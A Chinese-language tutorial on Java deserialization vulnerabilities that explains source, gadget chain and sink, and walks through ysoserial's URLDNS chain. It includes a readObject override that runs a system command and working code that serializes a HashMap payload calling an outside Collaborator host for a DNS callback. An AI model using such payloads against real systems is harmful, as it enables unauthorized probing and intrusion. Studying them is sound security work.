# 0x01 Preface

> Java序列化：指把Java对象转换为字节序列的过程，便于保存在内存、文件、数据库中
> `ObjectOutputStream`类的`writeObject()`方法可以实现序列化
>
> Java反序列化：指把字节序列恢复为Java对象的过程，
> `ObjectInputStream`类的`readObject()`方法用于反序列化

一个类要能反序列化需满足下面条件

1. 该类必须实现`java.io.Serializable`接口
2. 该类的所有属性必须是可序列化的

反序列化利用条件

1. 有反序列化接口，即能读入反序列化字节并执行`readObject()`方法
2. 有可利用的类，即`readObject`方法能连接到其他可利用点的类

注意：

* 静态成员变量不能被序列化（序列化是针对对象属性的，而静态成员变量属于类）
* `transient`标识的对象成员变量不参加反序列化（反序列化后值为null）

# 0x02 New Experience

创建一个Person类，注意这个类需要实现java.io.Serializable接口

序列化：

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class Serialization {
    public static void main(String[] args) throws Exception {
        Person person = new Person("Billy", 18);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(person);
    }
}
```

反序列化：

```java
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class Deserialize {
    public static void main(String[] args) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));
        Object person = ois.readObject();
        System.out.println(person);
    }
}
```

从反序列化到漏洞？

1. 入口类的`readObject`直接调用危险方法
2. 入口类参数中包含可控类，该类有危险方法，`readObject`时调用
3. 入口类参数中包含可控类，该类又调用其他有危险方法的类，`readObject`时调用

```java
// Person类中重写readObject
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    Runtime.getRuntime().exec("calc");
}
```

此时执行反序列化操作就会触发`Runtime.getRuntime().exec("calc");`

对于利用链上的类，都需要**实现`Serializable`接口、或继承该接口的实现类**

* Source：入口类（重写`readObject`调用常见方法，参数类型宽泛，最好jdk自带）
* Gadget Chain：调用链（相同方法名、相同参数类型、不同调用过程）
* Sink：执行类（RCE、SSRF、写文件...）

常见方法：`toString`、`hashCode`、`equals`

在后面的CC链中经常看到`HashMap`作为入口类，它实现了`Serializable`接口且作为jdk自带的类，`readObject`中调用了常见方法`hashCode`，是不错的入口类。

# 0x03 Best Practice

以`ysoserial`上的URLDNS为例：

上面讲到`HashMap`的`readObject`会调用`hashCode()`方法

```java
// HashMap#readObject
// Read the keys and values, and put the mappings in the HashMap
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();
    V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
}
// ====================================================================
// HashMap#hash
// 调用hash是为保证键的唯一性
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

`hash`方法的参数key的类型是`Object`，满足**参数类型宽泛**

最后会调用键对象的`hashCode`方法。

下面看看URL类的`hashCode`方法

```java
// URL#hashCode
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;
    
    hashCode = handler.hashCode(this);
    return hashCode;
}
// URLStreamHandler#hashCode
protected int hashCode(URL u) {
    InetAddress addr = getHostAddress(u);
    // ....
}
```

`hashCode == -1`时会调用`handler.hashCode`，而URL类初始化的时候hashCode就被赋值-1

查看URL类的handler定义 `transient URLStreamHandler handler;`

`getHostAddress`用于获取IP地址，发送请求给DNS【可用于检查是否存在SSRF】

------

还有一个问题：在构造hashMap时调用put实际上会改变key的hashCode

```java
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```

这时候就已经触发`URLStreamHandler#hashCode->getHostAddress`发起了一个DNS请求，会干扰反序列化时发起的DNS请求。

如果put的时候URL类的`hashCode != -1`就不会触发DNS请求
可以通过反射来修正。

```java
HashMap<URL, Integer> hashMap = new HashMap<>();
URL url = new URL("http://pun5j25rm4k6pazbyzmbukp9g0mtai.oastify.com");
// 通过反射修改 hashCode != -1
Field h = url.getClass().getDeclaredField("hashCode");
h.setAccessible(true);
h.set(url, 123456);
hashMap.put(url, 1);
// put之后再修改回来
h.set(url, -1);

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
oos.writeObject(hashMap);
```

可以通过Burp的`Collaborator client`来接收DNS请求

